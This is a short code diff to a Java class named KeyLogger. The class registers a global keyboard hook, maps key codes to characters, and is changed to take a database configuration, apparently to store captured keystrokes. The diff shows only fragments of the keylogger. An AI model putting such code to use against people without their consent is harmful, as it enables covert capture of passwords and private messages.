@@ -20,7 +20,7 @@ public class KeyLogger implements NativeKeyListener {
 	private String data;
 	private HashMap<Integer, String> keyword = new HashMap<>();
 	
-	public KeyLogger() {
+	public KeyLogger(DBConfig conf) {
 		// TODO Auto-generated constructor stub
 		keyword.put(NativeKeyEvent.VC_0,"0");
     	keyword.put(NativeKeyEvent.VC_1,"1");
@@ -108,13 +108,13 @@ public class KeyLogger implements NativeKeyListener {
 
 	@Override
 	public void nativeKeyTyped(NativeKeyEvent e) {
+		//Get if this is a CAPS LOCK,
         //System.out.println("Key Typed: " + e.getKeyText(e.getKeyCode()));
     }
 
     public static void main(String[] args) {
         try {
             GlobalScreen.registerNativeHook();
-            
             logger = Logger.getLogger(GlobalScreen.class.getPackage().getName());
             logger.setLevel(Level.WARNING);
         }
@@ -125,6 +125,6 @@ public class KeyLogger implements NativeKeyListener {
             System.exit(1);
         }
 
-        GlobalScreen.addNativeKeyListener(new KeyLogger());
+        GlobalScreen.addNativeKeyListener(new KeyLogger(null));
     }
 }
